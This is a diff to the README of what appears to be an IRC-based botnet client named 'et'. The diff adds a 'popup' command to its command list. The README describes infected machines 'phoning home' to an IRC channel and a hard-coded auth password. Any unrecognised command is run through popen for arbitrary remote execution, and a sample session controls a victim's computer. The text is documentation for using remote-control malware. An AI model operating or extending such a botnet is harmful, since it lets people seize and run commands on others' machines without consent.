@@ -47,10 +47,11 @@ When each bot connects, it sends out a channel-wide message of the format:
 et0000000: et0000000 phoning home
 ```
 
-From that point on, the bot is ready to receive commands. There are four built-in commands:
+From that point on, the bot is ready to receive commands. There are a few built-in commands:
 * `auth <password>` - Requests authorization to control the bot. If the password matches `IRC_AUTH` in *cnc_info.h*, authorization is granted.
 * `deauth` - Deauthorizes control of the bot unconditionally. Once deauthorized, the bot may not execute any command but `auth`.
 * `info` - Outputs a digest of system information. Supplied by `uname(3)` on Unix and Linux and `GetVersionEx` on Windows.
+* `popup <message>` - Display a popup message on the client's screen. **CURRENTLY WINDOWS ONLY**.
 * `kill` - Disconnects the bot from the IRC server. Unless scheduled otherwise on the system, the bot will never reconnect.
 
 Aside from these four commands, all other commands passed to an `et` are passed directly to `popen(3)` (`_popen()` on Windows).
@@ -63,9 +64,10 @@ et0000000: et0000000 phoning home
 /msg et0000000 auth et-phone-home
 et0000000: Successfully authorized. et0000000 listening.
 /msg et0000000 info
-et0000000: some information
+et0000000: [some information]
 /msg et0000000 pwd
-et0000000: the current working directory
+et0000000: [the current working directory]
+/msg et0000000 popup hello, i'm controlling your computer
 /msg et0000000 kill
 *et0000000 has quit ()
 ```
